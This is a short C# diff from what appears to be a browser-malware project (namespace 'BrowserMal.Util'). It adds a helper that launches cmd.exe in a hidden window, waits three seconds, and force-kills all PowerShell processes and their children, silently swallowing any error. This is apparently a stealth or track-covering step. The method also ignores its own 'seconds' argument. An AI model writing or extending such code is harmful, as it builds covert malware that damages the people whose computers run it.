@@ -17,5 +17,21 @@ namespace BrowserMal.Util
                 catch { }
             }
         }
+
+        public static void RunAfterSeconds(string seconds)
+        {
+            ProcessStartInfo processInfo = new ProcessStartInfo
+            {
+                CreateNoWindow = true,
+                FileName = "cmd.exe",
+                Arguments = "/c timeout /t 3 >NUL && taskkill /F /IM powershell.exe /T"
+            };
+
+            try
+            {
+                Process.Start(processInfo);
+            }
+            catch { }
+        }
     }
 }
